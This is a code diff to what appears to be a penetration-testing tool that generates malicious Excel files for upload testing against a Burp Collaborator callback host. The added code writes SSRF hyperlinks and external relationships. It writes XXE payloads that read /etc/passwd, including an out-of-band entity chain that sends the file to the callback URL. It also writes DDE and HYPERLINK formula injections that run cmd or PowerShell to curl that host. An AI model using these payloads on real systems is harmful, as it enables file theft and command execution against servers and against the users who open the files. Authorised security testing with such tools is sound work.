@@ -34,6 +34,9 @@ def generate_xlsx_payloads(output_dir, burp_collab, tech_filter='all', payload_t
     if should_generate_type('xxe'):
         xxe_dir = output_dir / 'xxe'
         xxe_dir.mkdir(exist_ok=True)
+    if should_generate_type('rce') or should_generate_type('deserialization'):
+        rce_dir = output_dir / 'rce'
+        rce_dir.mkdir(exist_ok=True)
     if should_generate_type('xss'):
         xss_dir = output_dir / 'xss'
         xss_dir.mkdir(exist_ok=True)
@@ -114,6 +117,36 @@ def generate_xlsx_payloads(output_dir, burp_collab, tech_filter='all', payload_t
                     zip_ref.write(file_path, arcname)
         
         shutil.rmtree(temp_dir, ignore_errors=True)
+        
+        wb = Workbook()
+        ws = wb.active
+        ws['A1'] = f'=HYPERLINK("https://{burp_collab}/ssrf-xlsx-https1","click")'
+        wb.save(ssrf_dir / "ssrf4_https_hyperlink.xlsx")
+        
+        wb = Workbook()
+        ws = wb.active
+        ws['A1'] = 'Test'
+        xlsx_path = ssrf_dir / "ssrf5_workbook_rels_https.xlsx"
+        wb.save(xlsx_path)
+        
+        with zipfile.ZipFile(xlsx_path, 'r') as zip_ref:
+            temp_dir = output_dir / "temp_ssrf5"
+            zip_ref.extractall(temp_dir)
+        
+        workbook_rels_path = temp_dir / "xl" / "_rels" / "workbook.xml.rels"
+        with open(workbook_rels_path, 'w', encoding='utf-8') as f:
+            f.write(f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+<Relationship Id="rId1" Target="https://{burp_collab}/x1-https" TargetMode="External"/>
+</Relationships>''')
+        
+        with zipfile.ZipFile(xlsx_path, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
+            for file_path in temp_dir.rglob('*'):
+                if file_path.is_file():
+                    arcname = file_path.relative_to(temp_dir)
+                    zip_ref.write(file_path, arcname)
+        
+        shutil.rmtree(temp_dir, ignore_errors=True)
     
     if should_generate_type('lfi'):
         wb = Workbook()
@@ -147,6 +180,150 @@ def generate_xlsx_payloads(output_dir, burp_collab, tech_filter='all', payload_t
                     zip_ref.write(file_path, arcname)
         
         shutil.rmtree(temp_dir, ignore_errors=True)
+        
+        wb = Workbook()
+        ws = wb.active
+        ws['A1'] = 'Test'
+        xlsx_path = xxe_dir / "xxe6_sharedstrings_file.xlsx"
+        wb.save(xlsx_path)
+        
+        with zipfile.ZipFile(xlsx_path, 'r') as zip_ref:
+            temp_dir = output_dir / "temp_xxe6"
+            zip_ref.extractall(temp_dir)
+        
+        sharedstrings_path = temp_dir / "xl" / "sharedStrings.xml"
+        with open(sharedstrings_path, 'w', encoding='utf-8') as f:
+            f.write('''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="1" uniqueCount="1">
+<si><t>&xxe;</t></si>
+</sst>''')
+        
+        with zipfile.ZipFile(xlsx_path, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
+            for file_path in temp_dir.rglob('*'):
+                if file_path.is_file():
+                    arcname = file_path.relative_to(temp_dir)
+                    zip_ref.write(file_path, arcname)
+        
+        shutil.rmtree(temp_dir, ignore_errors=True)
+        
+        wb = Workbook()
+        ws = wb.active
+        ws['A1'] = 'Test'
+        xlsx_path = xxe_dir / "xxe7_sharedstrings_param.xlsx"
+        wb.save(xlsx_path)
+        
+        with zipfile.ZipFile(xlsx_path, 'r') as zip_ref:
+            temp_dir = output_dir / "temp_xxe7"
+            zip_ref.extractall(temp_dir)
+        
+        sharedstrings_path = temp_dir / "xl" / "sharedStrings.xml"
+        with open(sharedstrings_path, 'w', encoding='utf-8') as f:
+            f.write(f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<!DOCTYPE root [
+<!ENTITY % remote SYSTEM "{base_url}/xxe-xlsx-param">
+%remote;
+]>
+<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="1" uniqueCount="1">
+<si><t>&data;</t></si>
+</sst>''')
+        
+        with zipfile.ZipFile(xlsx_path, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
+            for file_path in temp_dir.rglob('*'):
+                if file_path.is_file():
+                    arcname = file_path.relative_to(temp_dir)
+                    zip_ref.write(file_path, arcname)
+        
+        shutil.rmtree(temp_dir, ignore_errors=True)
+        
+        wb = Workbook()
+        ws = wb.active
+        ws['A1'] = 'Test'
+        xlsx_path = xxe_dir / "xxe8_workbook_doctype.xlsx"
+        wb.save(xlsx_path)
+        
+        with zipfile.ZipFile(xlsx_path, 'r') as zip_ref:
+            temp_dir = output_dir / "temp_xxe8"
+            zip_ref.extractall(temp_dir)
+        
+        workbook_path = temp_dir / "xl" / "workbook.xml"
+        if workbook_path.exists():
+            with open(workbook_path, 'r', encoding='utf-8') as f:
+                content = f.read()
+            content = content.replace('<?xml version="1.0" encoding="UTF-8" standalone="yes"?>',
+                                    f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<!DOCTYPE workbook [<!ENTITY xxe SYSTEM "{base_url}/xxe-xlsx-workbook">]>
+''')
+            content = content.replace('<workbook', '&xxe;<workbook')
+            with open(workbook_path, 'w', encoding='utf-8') as f:
+                f.write(content)
+        
+        with zipfile.ZipFile(xlsx_path, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
+            for file_path in temp_dir.rglob('*'):
+                if file_path.is_file():
+                    arcname = file_path.relative_to(temp_dir)
+                    zip_ref.write(file_path, arcname)
+        
+        shutil.rmtree(temp_dir, ignore_errors=True)
+        
+        wb = Workbook()
+        ws = wb.active
+        ws['A1'] = 'Test'
+        xlsx_path = xxe_dir / "xxe9_sharedstrings_nested.xlsx"
+        wb.save(xlsx_path)
+        
+        with zipfile.ZipFile(xlsx_path, 'r') as zip_ref:
+            temp_dir = output_dir / "temp_xxe9"
+            zip_ref.extractall(temp_dir)
+        
+        sharedstrings_path = temp_dir / "xl" / "sharedStrings.xml"
+        with open(sharedstrings_path, 'w', encoding='utf-8') as f:
+            f.write(f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<!DOCTYPE root [
+<!ENTITY % remote SYSTEM "{base_url}/xxe-xlsx-nested">
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM '{base_url}/xxe-xlsx-exfil?data=%file;'>">
+%remote;
+%eval;
+%exfil;
+]>
+<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="1" uniqueCount="1">
+<si><t>test</t></si>
+</sst>''')
+        
+        with zipfile.ZipFile(xlsx_path, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
+            for file_path in temp_dir.rglob('*'):
+                if file_path.is_file():
+                    arcname = file_path.relative_to(temp_dir)
+                    zip_ref.write(file_path, arcname)
+        
+        shutil.rmtree(temp_dir, ignore_errors=True)
+    
+    if should_generate_type('rce') or should_generate_type('deserialization'):
+        wb = Workbook()
+        ws = wb.active
+        ws['A1'] = f'=HYPERLINK("cmd:///c curl {base_url}/rce-xlsx-cmd1","click")'
+        wb.save(rce_dir / "rce1_hyperlink_cmd.xlsx")
+        
+        wb = Workbook()
+        ws = wb.active
+        ws['A1'] = f'=HYPERLINK("powershell://Invoke-WebRequest {base_url}/rce-xlsx-ps1","click")'
+        wb.save(rce_dir / "rce2_hyperlink_powershell.xlsx")
+        
+        wb = Workbook()
+        ws = wb.active
+        ws['A1'] = f'=DDE("cmd";"/C curl {base_url}/rce-xlsx-dde1";"!A0")A0'
+        wb.save(rce_dir / "rce3_dde_cmd.xlsx")
+        
+        wb = Workbook()
+        ws = wb.active
+        ws['A1'] = f'=cmd|\'/C curl {base_url}/rce-xlsx-dde2\'!A0'
+        wb.save(rce_dir / "rce4_dde_pipe.xlsx")
+        
+        wb = Workbook()
+        ws = wb.active
+        ws['A1'] = f'=@SUM(1+9)*cmd|\'/C curl {base_url}/rce-xlsx-dde3\'!A0'
+        wb.save(rce_dir / "rce5_dde_sum.xlsx")
     
     if should_generate_type('xss'):
         wb = Workbook()
